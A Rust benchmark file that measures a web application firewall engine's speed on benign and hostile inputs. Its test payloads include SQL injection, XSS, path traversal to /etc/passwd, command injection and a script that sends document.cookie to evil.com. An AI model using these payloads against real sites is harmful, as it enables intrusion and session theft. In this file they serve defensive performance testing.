//! WAF Performance Benchmarks
//!
//! Verifies performance targets from the roadmap:
//! - <5ms for 500 rules on 1KB input
//! - <50MB steady state memory

use criterion::{black_box, criterion_group, criterion_main, Criterion, BenchmarkId, Throughput};
use sentinel_agent_waf::{WafConfig, WafEngine};

/// Generate realistic test payloads
fn generate_payloads() -> Vec<(&'static str, String)> {
    vec![
        ("benign_small", "user=john&action=view".to_string()),
        ("benign_medium", generate_benign_medium()),
        ("benign_large", generate_benign_large()),
        ("sqli_simple", "' OR '1'='1".to_string()),
        ("sqli_union", "1 UNION SELECT * FROM users--".to_string()),
        ("sqli_obfuscated", "1'/**/UNION/**/SELECT/**/password/**/FROM/**/users--".to_string()),
        ("xss_simple", "<script>alert(1)</script>".to_string()),
        ("xss_encoded", "%3Cscript%3Ealert(1)%3C/script%3E".to_string()),
        ("xss_event", "<img src=x onerror=alert(1)>".to_string()),
        ("path_traversal", "../../etc/passwd".to_string()),
        ("cmd_injection", "; cat /etc/passwd".to_string()),
        ("mixed_attack", generate_mixed_attack()),
    ]
}

fn generate_benign_medium() -> String {
    // ~500 bytes of realistic form data
    let mut s = String::with_capacity(600);
    s.push_str("username=john_doe_123&");
    s.push_str("email=john.doe@example.com&");
    s.push_str("first_name=John&");
    s.push_str("last_name=Doe&");
    s.push_str("address=123 Main Street, Apt 4B&");
    s.push_str("city=New York&");
    s.push_str("state=NY&");
    s.push_str("zip=10001&");
    s.push_str("phone=212-555-1234&");
    s.push_str("bio=Software developer with 10 years of experience in web development.&");
    s.push_str("preferences=dark_mode,notifications,weekly_digest&");
    s.push_str("csrf_token=a1b2c3d4e5f6g7h8i9j0");
    s
}

fn generate_benign_large() -> String {
    // ~2KB of realistic JSON payload
    let mut s = String::with_capacity(2048);
    s.push_str(r#"{"user":{"id":12345,"name":"John Doe","email":"john@example.com","profile":{"bio":"Software developer","location":"New York","website":"https://johndoe.dev","skills":["rust","python","javascript","go","kubernetes"],"experience":[{"company":"TechCorp","role":"Senior Developer","years":5},{"company":"StartupXYZ","role":"Lead Engineer","years":3}]},"settings":{"theme":"dark","notifications":true,"language":"en-US","timezone":"America/New_York"},"metadata":{"created_at":"2024-01-15T10:30:00Z","updated_at":"2024-12-01T15:45:00Z","last_login":"2024-12-10T08:00:00Z","login_count":847}}}"#);
    // Pad to ~2KB
    while s.len() < 2000 {
        s.push_str(r#","extra_field":"value""#);
    }
    s
}

fn generate_mixed_attack() -> String {
    // Payload with multiple attack indicators
    "q=search&user=' OR 1=1--&callback=<script>alert(document.cookie)</script>&file=../../etc/passwd&cmd=;id".to_string()
}

/// Benchmark rule matching performance
fn benchmark_rule_matching(c: &mut Criterion) {
    let config = WafConfig::default();
    let engine = WafEngine::new(config);
    let payloads = generate_payloads();

    let mut group = c.benchmark_group("rule_matching");

    for (name, payload) in &payloads {
        group.throughput(Throughput::Bytes(payload.len() as u64));
        group.bench_with_input(
            BenchmarkId::new("check", name),
            payload,
            |b, input| {
                b.iter(|| {
                    engine.check(
                        black_box("/api/test"),
                        black_box(Some(input)),
                        black_box(&[]),
                        black_box(None),
                        black_box(None),
                    )
                })
            },
        );
    }

    group.finish();
}

/// Benchmark with varying paranoia levels
fn benchmark_paranoia_levels(c: &mut Criterion) {
    let payload = "' OR '1'='1 UNION SELECT * FROM users WHERE id=1--";

    let mut group = c.benchmark_group("paranoia_levels");

    for level in 1..=4 {
        let mut config = WafConfig::default();
        config.paranoia_level = level;
        let engine = WafEngine::new(config);

        group.bench_with_input(
            BenchmarkId::new("level", level),
            &payload,
            |b, input| {
                b.iter(|| {
                    engine.check(
                        black_box("/search"),
                        black_box(Some(input)),
                        black_box(&[]),
                        black_box(None),
                        black_box(None),
                    )
                })
            },
        );
    }

    group.finish();
}

/// Benchmark body inspection with varying sizes
fn benchmark_body_sizes(c: &mut Criterion) {
    let config = WafConfig::default();
    let engine = WafEngine::new(config);

    let mut group = c.benchmark_group("body_sizes");

    // Test various body sizes
    let sizes = [100, 500, 1024, 4096, 16384, 65536];

    for size in sizes {
        let body = generate_body_with_attack(size);

        group.throughput(Throughput::Bytes(size as u64));
        group.bench_with_input(
            BenchmarkId::new("body_kb", size / 1024),
            &body,
            |b, input| {
                b.iter(|| {
                    engine.check(
                        black_box("/api/data"),
                        black_box(None),
                        black_box(&[("Content-Type".to_string(), "application/json".to_string())]),
                        black_box(Some(input.as_bytes())),
                        black_box(None),
                    )
                })
            },
        );
    }

    group.finish();
}

fn generate_body_with_attack(size: usize) -> String {
    let base = r#"{"data":"value","nested":{"field":"' OR 1=1--"},"#;
    let mut body = base.to_string();

    // Pad to desired size
    while body.len() < size - 20 {
        body.push_str(r#""padding":"xxxxxxxxxx","#);
    }
    body.push_str(r#""end":"done"}"#);
    body.truncate(size);
    body
}

/// Benchmark header inspection
fn benchmark_header_inspection(c: &mut Criterion) {
    let config = WafConfig::default();
    let engine = WafEngine::new(config);

    let mut group = c.benchmark_group("header_inspection");

    // Normal headers
    let normal_headers = vec![
        ("User-Agent".to_string(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string()),
        ("Accept".to_string(), "text/html,application/xhtml+xml,application/xml".to_string()),
        ("Accept-Language".to_string(), "en-US,en;q=0.9".to_string()),
        ("Cookie".to_string(), "session=abc123; prefs=dark".to_string()),
    ];

    // Attack headers
    let attack_headers = vec![
        ("User-Agent".to_string(), "sqlmap/1.0".to_string()),
        ("X-Forwarded-For".to_string(), "127.0.0.1, ' OR 1=1--".to_string()),
        ("Referer".to_string(), "https://evil.com/<script>alert(1)</script>".to_string()),
        ("Cookie".to_string(), "admin=true; sql=' UNION SELECT *--".to_string()),
    ];

    group.bench_function("normal_headers", |b| {
        b.iter(|| {
            engine.check(
                black_box("/"),
                black_box(None),
                black_box(&normal_headers),
                black_box(None),
                black_box(None),
            )
        })
    });

    group.bench_function("attack_headers", |b| {
        b.iter(|| {
            engine.check(
                black_box("/"),
                black_box(None),
                black_box(&attack_headers),
                black_box(None),
                black_box(None),
            )
        })
    });

    group.finish();
}

/// Benchmark automata engine specifically
fn benchmark_automata(c: &mut Criterion) {
    let config = WafConfig::default();
    let engine = WafEngine::new(config);

    let mut group = c.benchmark_group("automata_engine");

    // Test pattern that should match multiple rules
    let multi_match = "UNION SELECT password FROM users WHERE '1'='1' AND <script>document.cookie</script>";

    group.bench_function("multi_pattern_match", |b| {
        b.iter(|| {
            engine.check(
                black_box("/search"),
                black_box(Some(multi_match)),
                black_box(&[]),
                black_box(None),
                black_box(None),
            )
        })
    });

    // Test pattern that matches no rules (worst case - full scan)
    let no_match = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.";

    group.bench_function("no_pattern_match", |b| {
        b.iter(|| {
            engine.check(
                black_box("/about"),
                black_box(Some(no_match)),
                black_box(&[]),
                black_box(None),
                black_box(None),
            )
        })
    });

    group.finish();
}

/// Benchmark ML detection if enabled
fn benchmark_ml_detection(c: &mut Criterion) {
    let mut config = WafConfig::default();
    config.ml.enabled = true;
    config.ml.classifier_enabled = true;
    let engine = WafEngine::new(config);

    let mut group = c.benchmark_group("ml_detection");

    let payloads = vec![
        ("benign", "SELECT name FROM products WHERE category = 'electronics'"),
        ("sqli", "' OR '1'='1' UNION SELECT password FROM users--"),
        ("xss", "<script>document.location='http://evil.com/'+document.cookie</script>"),
    ];

    for (name, payload) in payloads {
        group.bench_function(name, |b| {
            b.iter(|| {
                engine.check(
                    black_box("/api/search"),
                    black_box(Some(payload)),
                    black_box(&[]),
                    black_box(None),
                    black_box(None),
                )
            })
        });
    }

    group.finish();
}

/// Benchmark full request inspection (simulates real-world usage)
fn benchmark_full_request(c: &mut Criterion) {
    let config = WafConfig::default();
    let engine = WafEngine::new(config);

    let mut group = c.benchmark_group("full_request");

    // Simulate a complete request with all components
    let headers = vec![
        ("User-Agent".to_string(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string()),
        ("Accept".to_string(), "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8".to_string()),
        ("Accept-Language".to_string(), "en-US,en;q=0.5".to_string()),
        ("Accept-Encoding".to_string(), "gzip, deflate, br".to_string()),
        ("Connection".to_string(), "keep-alive".to_string()),
        ("Cookie".to_string(), "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; prefs=theme%3Ddark%26lang%3Den".to_string()),
        ("Content-Type".to_string(), "application/json".to_string()),
    ];

    let body = r#"{"search":"laptop","filters":{"price_min":500,"price_max":2000,"brand":["apple","dell","lenovo"]},"sort":"relevance","page":1}"#;

    // Benign request
    group.bench_function("benign_full", |b| {
        b.iter(|| {
            engine.check(
                black_box("/api/v1/products/search"),
                black_box(Some("category=electronics&limit=20")),
                black_box(&headers),
                black_box(Some(body.as_bytes())),
                black_box(None),
            )
        })
    });

    // Attack request
    let attack_body = r#"{"search":"laptop' UNION SELECT * FROM users--","callback":"<script>alert(1)</script>"}"#;

    group.bench_function("attack_full", |b| {
        b.iter(|| {
            engine.check(
                black_box("/api/v1/products/search"),
                black_box(Some("q=' OR 1=1--&debug=true")),
                black_box(&headers),
                black_box(Some(attack_body.as_bytes())),
                black_box(None),
            )
        })
    });

    group.finish();
}

/// Benchmark response body inspection
fn benchmark_response_inspection(c: &mut Criterion) {
    let mut config = WafConfig::default();
    config.response_inspection_enabled = true;
    config.sensitive_data.enabled = true;
    let engine = WafEngine::new(config);

    let mut group = c.benchmark_group("response_inspection");

    // Response with no sensitive data
    let clean_response = r#"{"user":{"name":"John Doe","email":"j***@example.com","id":12345}}"#;

    // Response with sensitive data
    let sensitive_response = r#"{"user":{"name":"John Doe","ssn":"123-45-6789","card":"4111111111111111","aws_key":"AKIAIOSFODNN7EXAMPLE"}}"#;

    group.bench_function("clean_response", |b| {
        b.iter(|| {
            engine.check_response_body(black_box(clean_response.as_bytes()))
        })
    });

    group.bench_function("sensitive_response", |b| {
        b.iter(|| {
            engine.check_response_body(black_box(sensitive_response.as_bytes()))
        })
    });

    group.finish();
}

/// Benchmark throughput (requests per second)
fn benchmark_throughput(c: &mut Criterion) {
    let config = WafConfig::default();
    let engine = WafEngine::new(config);

    let mut group = c.benchmark_group("throughput");
    group.throughput(Throughput::Elements(1));

    // Measure raw requests per second with typical payload
    let query = "search=laptop&category=electronics&page=1";
    let headers = vec![
        ("User-Agent".to_string(), "Mozilla/5.0".to_string()),
    ];

    group.bench_function("requests_per_sec", |b| {
        b.iter(|| {
            engine.check(
                black_box("/api/search"),
                black_box(Some(query)),
                black_box(&headers),
                black_box(None),
                black_box(None),
            )
        })
    });

    group.finish();
}

criterion_group!(
    benches,
    benchmark_rule_matching,
    benchmark_paranoia_levels,
    benchmark_body_sizes,
    benchmark_header_inspection,
    benchmark_automata,
    benchmark_ml_detection,
    benchmark_full_request,
    benchmark_response_inspection,
    benchmark_throughput,
);

criterion_main!(benches);
